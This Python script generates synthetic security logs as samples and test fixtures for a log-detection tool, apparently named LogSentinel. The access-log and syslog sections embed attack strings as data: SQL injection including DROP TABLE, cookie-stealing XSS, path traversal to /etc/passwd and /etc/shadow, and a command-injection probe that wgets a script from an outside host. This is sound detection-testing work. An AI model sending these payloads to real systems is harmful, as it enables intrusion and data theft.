"""Generate deterministic sample security logs in samples/.

The samples let you try LogSentinel immediately and double as an
integration test fixture: each file embeds known attacks that the
detectors are expected to find (see tests/test_samples.py).

Usage:  python scripts/generate_samples.py
"""

import os
from datetime import datetime, timedelta

HERE = os.path.dirname(os.path.abspath(__file__))
SAMPLES = os.path.normpath(os.path.join(HERE, "..", "samples"))

# ---------------------------------------------------------------- auth.log

def gen_auth(path):
    entries = []  # (timestamp, line)
    host = "web01"

    def add(ts, line):
        entries.append((ts, "{} {:2d} {:02d}:{:02d}:{:02d} {}".format(
            ts.strftime("%b"), ts.day, ts.hour, ts.minute, ts.second, line)))

    # Routine noise over three days: cron, accepted SSH, logind.
    start = datetime(2026, 9, 8, 0, 7, 0)
    for i in range(36):
        ts = start + timedelta(hours=2 * i)
        add(ts, "{} CROND[{}]: (root) CMD (/usr/local/bin/backup.sh)".format(host, 2200 + i))
        add(ts + timedelta(minutes=3),
            "{} sshd[{}]: Accepted password for deploy from 10.0.0.15 port {} ssh2".format(
                host, 3100 + i, 49000 + i))
        add(ts + timedelta(minutes=4),
            "{} systemd-logind[911]: New session {} of user deploy.".format(host, 300 + i))

    # Brute force from 203.0.113.66 followed by a successful login.
    t = datetime(2026, 9, 9, 2, 13, 0)
    attack_ip = "203.0.113.66"
    for i in range(42):
        ts = t + timedelta(seconds=6 * i)
        user = "root" if i % 2 else "admin"
        add(ts, "{} sshd[{}]: Failed password for {} from {} port {} ssh2".format(
            host, 4400 + i, user, attack_ip, 52000 + i))
    add(t + timedelta(seconds=260),
        "{} sshd[4490]: Accepted password for admin from {} port 52191 ssh2".format(
            host, attack_ip))

    # Username enumeration from another host.
    t2 = datetime(2026, 9, 9, 3, 40, 0)
    for i, user in enumerate(["oracle", "postgres", "test", "guest", "pi",
                              "ubuntu", "service", "admin", "operator"]):
        add(t2 + timedelta(minutes=i),
            "{} sshd[{}]: Invalid user {} from 198.51.100.23 port {} ssh2".format(
                host, 4500 + i, user, 56000 + i * 7))

    # Reverse-DNS break-in attempt.
    add(datetime(2026, 9, 9, 4, 2, 11),
        "{} sshd[4601]: reverse mapping checking getaddrinfo for 45.79.180.7 "
        "failed - POSSIBLE BREAK-IN ATTEMPT!".format(host))
    add(datetime(2026, 9, 9, 4, 2, 11),
        "{} sshd[4601]: Failed publickey for root from 45.79.180.7 port 41022 ssh2".format(host))

    # Unauthorized sudo, persistence, root session.
    add(datetime(2026, 9, 9, 9, 15, 2),
        "{} sudo[4700]: www-data : user NOT in sudoers ; TTY=pts/0 ; "
        "PWD=/var/www ; USER=root ; COMMAND=/bin/bash".format(host))
    add(datetime(2026, 9, 9, 9, 16, 40),
        "{} sudo[4701]: pam_unix(sudo:auth): authentication failure; logname= "
        "uid=33 euid=33 tty=pts/0 ruser=www-data rhost=  user=www-data".format(host))
    add(datetime(2026, 9, 9, 9, 18, 0),
        "{} useradd[4750]: new user: name=backdoor, UID=1002, GID=1002, "
        "home=/home/backdoor, shell=/bin/bash, from /dev/pts/0".format(host))
    add(datetime(2026, 9, 9, 9, 18, 30),
        "{} sudo[4760]: pam_unix(sudo:session): session opened for user root "
        "by (uid=0)".format(host))
    add(datetime(2026, 9, 9, 10, 0, 0),
        "{} sudo[4760]: pam_unix(sudo:session): session closed for user root".format(host))

    entries.sort(key=lambda item: item[0])
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        for _, line in entries:
            fh.write(line + "\n")
    return len(entries)


# ------------------------------------------------------------ access.log

def apache_line(ts, ip, method, target, status, size=512, ua="-", referer="-"):
    return '%s - - [%s] "%s %s HTTP/1.1" %s %s "%s" "%s"' % (
        ip, ts.strftime("%d/%b/%Y:%H:%M:%S +0000"), method, target,
        status, size, referer, ua)


def gen_access(path):
    entries = []
    chrome = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "Chrome/126.0.0.0 Safari/537.36")
    firefox = "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
    safari = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
              "Safari/605.1.15")
    normal = [
        ("10.0.0.15", chrome),
        ("10.0.0.22", firefox),
        ("10.0.0.31", safari),
        ("10.0.0.44", chrome),
        ("10.0.0.57", firefox),
    ]
    paths = [
        ("/", 200), ("/about", 200), ("/pricing", 200),
        ("/blog/2026/09/zero-trust-basics", 200),
        ("/api/items?page=2", 200), ("/static/app.js", 304),
        ("/static/logo.png", 304), ("/contact", 200),
        ("/careers", 200), ("/old-promo", 404),
    ]
    start = datetime(2026, 9, 10, 8, 0, 0)
    for i in range(240):
        ts = start + timedelta(minutes=(i * 137) % 600)
        ip, ua = normal[i % 5]
        target, status = paths[(i * 7 + 3) % len(paths)]
        entries.append((ts, apache_line(ts, ip, "GET", target, status,
                                        size=1024, ua=ua)))

    # Directory enumeration with dirb (note: /.env and /.git return 200).
    t = datetime(2026, 9, 10, 14, 2, 0)
    scan_ip = "45.33.32.156"
    probes = [
        ("/admin", 404), ("/admin/", 404), ("/administrator", 404),
        ("/manager/html", 404), ("/backup.zip", 404), ("/backup.sql", 404),
        ("/db.sql", 404), ("/.env", 200), ("/.env.local", 404),
        ("/.git/config", 200), ("/.git/HEAD", 404), ("/wp-login.php", 404),
        ("/wp-admin/", 404), ("/phpmyadmin/", 404), ("/pma/", 404),
        ("/config.php", 404), ("/config.php.bak", 404), ("/.htaccess", 404),
        ("/.ssh/id_rsa", 404), ("/id_rsa", 404), ("/server-status", 403),
        ("/actuator/health", 404), ("/actuator/env", 404),
        ("/cgi-bin/test.cgi", 404), ("/../../etc/passwd", 404),
        ("/download?file=../../etc/passwd", 404),
        ("/vendor/phpunit/eval-stdin.php", 404), ("/console/", 404),
        ("/.DS_Store", 404), ("/WEB-INF/web.xml", 404), ("/debug", 404),
        ("/grafana/", 404), ("/jenkins/", 404), ("/kibana/", 404),
        ("/api/swagger.json", 404), ("/sitemap.xml", 404),
        ("/trace.axd", 404), ("/elmah.axd", 404), ("/shell.php", 404),
        ("/cmd.php", 404), ("/xmlrpc.php", 404),
    ]
    for i, (target, status) in enumerate(probes):
        ts = t + timedelta(seconds=3 * i)
        entries.append((ts, apache_line(
            ts, scan_ip, "GET", target, status, size=270,
            ua="dirb/2.22 (libwhisker/2.25)")))

    # SQL injection attempts with sqlmap.
    sqli_ip = "203.0.113.7"
    sqlmap_ua = "sqlmap/1.7.2#stable (http://sqlmap.org)"
    sqli = [
        ("/products.php?id=1' OR '1'='1", 500),
        ("/products.php?id=1 UNION SELECT username,password FROM users--", 500),
        ("/search.php?q=laptop%27%20UNION%20SELECT%20password%20FROM%20users--", 200),
        ("/item.php?cat=1;DROP TABLE orders", 500),
        ("/login.php?user=admin'--&pass=x", 401),
        ("/api/items?id=(SELECT 1 FROM information_schema.tables)", 500),
        ("/news.php?id=1 AND SLEEP(5)", 200),
        ("/cart.php?user=1' AND 1=1--", 200),
    ]
    for i, (target, status) in enumerate(sqli):
        ts = t + timedelta(seconds=90 + 7 * i)
        entries.append((ts, apache_line(ts, sqli_ip, "GET", target, status,
                                        ua=sqlmap_ua)))

    # XSS attempts with a normal-looking user agent.
    for i, target in enumerate([
        "/search?q=<script>alert(document.cookie)</script>",
        "/comment?text=<img src=x onerror=alert(1)>",
        "/profile?name=<svg onload=alert('xss')>",
        "/page?x=javascript:alert(1)",
    ]):
        ts = t + timedelta(seconds=200 + 11 * i)
        entries.append((ts, apache_line(ts, "192.0.2.88", "GET", target, 200,
                                        ua=chrome)))

    # Path traversal attempts.
    for i, target in enumerate([
        "/download?file=../../../../etc/passwd",
        "/download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow",
        "/view?tpl=....//....//....//etc/passwd",
    ]):
        ts = t + timedelta(seconds=280 + 9 * i)
        entries.append((ts, apache_line(ts, "198.18.7.9", "GET", target,
                                        200 if i != 1 else 403)))

    # Command-injection probing.
    entries.append((t + timedelta(seconds=330), apache_line(
        t + timedelta(seconds=330), "192.0.2.101", "GET",
        "/api/exec?cmd=cat /etc/passwd", 500)))
    entries.append((t + timedelta(seconds=345), apache_line(
        t + timedelta(seconds=345), "192.0.2.101", "GET",
        "/import?url=http://evil.example/x;wget http://45.33.32.156/x.sh", 404)))

    entries.sort(key=lambda item: item[0])
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        for _, line in entries:
            fh.write(line + "\n")
    return len(entries)


# ------------------------------------------------------------- events.csv

def gen_events(path):
    rows = []
    start = datetime(2026, 9, 10, 9, 0, 0)

    def add(ts, src, dst, port, proto, action, user, status, message):
        rows.append((ts, "{:%Y-%m-%dT%H:%M:%SZ},{},{},{},{},{},{},{},{}".format(
            ts, src, dst, port, proto, action, user, status, message)))

    # Routine HTTPS traffic from five workstations.
    hosts = ["10.0.0.21", "10.0.0.22", "10.0.0.23", "10.0.0.24", "10.0.0.25"]
    for i in range(200):
        ts = start + timedelta(seconds=90 * i)
        add(ts, hosts[i % 5], "10.0.0.5", 443, "TCP", "allow", "-", 200,
            "TLS connection to corporate web app")

    # An unusually chatty internal host (monitoring box).
    for i in range(200):
        ts = start + timedelta(seconds=18 * i)
        add(ts, "10.0.0.77", "10.0.0.9", 9200, "TCP", "allow", "-", 200,
            "Elasticsearch health probe")

    # Port scan from outside, one port per second.
    scan_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                  993, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200]
    t = start + timedelta(hours=1, minutes=30)
    for i, port in enumerate(scan_ports):
        add(t + timedelta(seconds=i), "185.220.101.5", "10.0.0.1", port,
            "TCP", "deny", "-", 403, "SYN scan blocked by firewall")

    # Cleartext protocols on the internal network.
    for i in range(3):
        ts = t + timedelta(minutes=10 + i)
        add(ts, "10.0.0.42", "10.0.0.8", 23, "TCP", "allow", "admin", 200,
            "telnet session opened")
    for i in range(2):
        ts = t + timedelta(minutes=20 + i)
        add(ts, "10.0.0.43", "10.0.0.8", 21, "TCP", "allow", "backup", 200,
            "FTP session opened")

    # Brute force against the VPN portal, then a successful login.
    for i in range(15):
        ts = t + timedelta(minutes=40 + i, seconds=12 * i)
        add(ts, "45.61.187.30", "10.0.0.5", 443, "TCP", "allow", "bob", 401,
            "authentication failure for user bob on vpn portal")
    add(t + timedelta(minutes=41, seconds=40), "45.61.187.30", "10.0.0.5",
        443, "TCP", "allow", "bob", 200, "login successful for user bob")

    rows.sort(key=lambda item: item[0])
    header = ("timestamp,src_ip,dst_ip,dst_port,protocol,action,user,"
              "status,message\n")
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(header)
        for _, line in rows:
            fh.write(line + "\n")
    return len(rows)


# ------------------------------------------------- extra syslog test files

def syslog_line(ts, host, program, pid, msg):
    """Build a standard RFC 3164 syslog line."""
    return "{} {:2d} {:02d}:{:02d}:{:02d} {} {}[{}]: {}".format(
        ts.strftime("%b"), ts.day, ts.hour, ts.minute, ts.second,
        host, program, pid, msg)


def _write_sorted(path, entries):
    entries.sort(key=lambda item: item[0])
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        for _, line in entries:
            fh.write(line + "\n")
    return len(entries)


def gen_syslog_baseline(path):
    """A clean, uneventful day: expected to produce ZERO findings."""
    entries = []
    host = "app01"
    start = datetime(2026, 9, 12, 0, 0, 0)

    for i in range(48):  # cron every 30 minutes, all day
        ts = start + timedelta(minutes=30 * i)
        entries.append((ts, syslog_line(ts, host, "CROND", 8100 + i,
                                        "(root) CMD (/usr/local/bin/backup-check.sh)")))
    for i in range(24):  # ntp sync once an hour
        ts = start + timedelta(hours=i, minutes=12)
        entries.append((ts, syslog_line(ts, host, "ntpd", 921,
                                        "time sync ok, offset +0.004s")))
    users = ["deploy", "jchen", "amara", "pkim"]
    for i in range(20):  # a few accepted logins, spread thin
        ts = start + timedelta(hours=(i * 7) % 24, minutes=(i * 13) % 60)
        entries.append((ts, syslog_line(
            ts, host, "sshd", 3200 + i,
            "Accepted password for {} from 10.0.0.{} port {} ssh2".format(
                users[i % 4], 15 + i % 4, 49000 + i))))
    for i in range(20):
        ts = start + timedelta(hours=(i * 7) % 24, minutes=(i * 13) % 60 + 1)
        entries.append((ts, syslog_line(
            ts, host, "systemd-logind", 911,
            "New session {} of user {}.".format(400 + i, users[i % 4]))))
    for i in range(12):  # routine housekeeping
        ts = start + timedelta(hours=2 * i, minutes=45)
        entries.append((ts, syslog_line(ts, host, "systemd", 1,
                                        "Starting Daily apt download activities...")))
    return _write_sorted(path, entries)


def gen_syslog_firewall(path):
    """Netfilter-style firewall syslog: port scan, telnet/FTP probes,
    off-hours spike, and a chatty scanner -> several findings."""
    entries = []
    host = "fw01"
    start = datetime(2026, 9, 12, 0, 0, 0)
    clock = [412345.678901]  # netfilter monotonic clock

    def nf(ts, action, src, dpt, proto="TCP"):
        clock[0] += 0.37
        line = ("{} {:2d} {:02d}:{:02d}:{:02d} {} kernel: [{:.6f}] {} IN=eth0 "
                "SRC={} DST=10.0.0.5 PROTO={} SPT={} DPT={}").format(
            ts.strftime("%b"), ts.day, ts.hour, ts.minute, ts.second,
            host, clock[0], action, src, proto,
            40000 + (int(clock[0]) % 20000), dpt)
        return (ts, line)

    hosts = ["10.0.0.21", "10.0.0.22", "10.0.0.23", "10.0.0.24", "10.0.0.25"]
    routine_ports = [443, 53, 8080]
    for i in range(60):  # normal traffic, spread across the whole day
        ts = start + timedelta(minutes=(i * 17) % 1440)
        entries.append(nf(ts, "ALLOW", hosts[i % 5], routine_ports[i % 3]))
    for i in range(6):  # partner site-to-site VPN
        ts = start + timedelta(hours=9, minutes=5 * i)
        entries.append(nf(ts, "ALLOW", "172.16.5.9", 1194, proto="UDP"))

    scan_ip = "185.23.44.10"
    t = datetime(2026, 9, 12, 2, 31, 0)
    scan_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                  465, 587, 993, 1433, 3306, 3389, 5432, 5900, 6379, 8080,
                  9200]
    for i, port in enumerate(scan_ports):  # one port per second
        entries.append(nf(t + timedelta(seconds=i), "DROP", scan_ip, port))
    for i in range(10):  # persistent telnet attempts
        entries.append(nf(t + timedelta(minutes=2, seconds=20 * i),
                         "DROP", scan_ip, 23))
    for i in range(8):  # persistent FTP attempts
        entries.append(nf(t + timedelta(minutes=5, seconds=25 * i),
                         "DROP", scan_ip, 21))
    for i in range(40):  # keeps probing after the initial sweep
        entries.append(nf(t + timedelta(minutes=7, seconds=8 * i),
                         "DROP", scan_ip, scan_ports[i % len(scan_ports)]))
    return _write_sorted(path, entries)


def gen_syslog_insider(path):
    """An insider-style syslog: quiet daytime baseline, then an off-hours
    bulk access burst, su brute force, and a blocked sudo command."""
    entries = []
    host = "app01"
    day = datetime(2026, 9, 12, 9, 0, 0)

    def app_line(ts, ip, path):
        return (ts, syslog_line(
            ts, host, "app", 8080,
            "request from {} GET {} status=200 duration={}ms".format(
                ip, path, 8 + ts.second % 40)))

    hosts = ["10.0.0.31", "10.0.0.32", "10.0.0.33", "10.0.0.34", "10.0.0.35"]
    paths = ["/api/records", "/api/reports", "/api/customers",
             "/api/inventory", "/api/audit"]
    for i in range(100):  # ordinary workday usage 09:00-17:00
        ts = day + timedelta(minutes=(i * 29) % 480)
        entries.append(app_line(ts, hosts[i % 5], paths[i % 5]))

    t = datetime(2026, 9, 13, 3, 0, 0)
    for i in range(150):  # 03:00: bulk pull of records, ~30/min for 5 min
        ts = t + timedelta(seconds=2 * i)
        entries.append(app_line(ts, "10.0.0.31", "/api/records"))

    t2 = datetime(2026, 9, 13, 3, 41, 0)
    for i in range(6):  # repeated 'su to root' failures, then sudo abuse
        ts = t2 + timedelta(seconds=45 * i)
        entries.append((ts, syslog_line(ts, host, "su", 2871 + i,
                                        "FAILED su for user root by dev")))
        ts2 = ts + timedelta(seconds=20)
        entries.append((ts2, syslog_line(
            ts2, host, "su", 2881 + i,
            "pam_unix(su:auth): authentication failure; logname= uid=1000 "
            "euid=1000 tty=pts/2 ruser=dev rhost=  user=dev")))
    ts3 = t2 + timedelta(minutes=6)
    entries.append((ts3, syslog_line(
        ts3, host, "sudo", 2921,
        "dev : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/dev ; "
        "USER=root ; COMMAND=/bin/cat /etc/shadow")))
    return _write_sorted(path, entries)


def main():
    os.makedirs(SAMPLES, exist_ok=True)
    counts = {
        "auth_syslog.log": gen_auth(os.path.join(SAMPLES, "auth_syslog.log")),
        "access_apache.log": gen_access(os.path.join(SAMPLES, "access_apache.log")),
        "events.csv": gen_events(os.path.join(SAMPLES, "events.csv")),
        "syslog_baseline.log": gen_syslog_baseline(os.path.join(SAMPLES, "syslog_baseline.log")),
        "syslog_firewall.log": gen_syslog_firewall(os.path.join(SAMPLES, "syslog_firewall.log")),
        "syslog_insider.log": gen_syslog_insider(os.path.join(SAMPLES, "syslog_insider.log")),
    }
    for name, count in counts.items():
        print("Wrote samples/{:<20} ({} lines)".format(name, count))


if __name__ == "__main__":
    main()
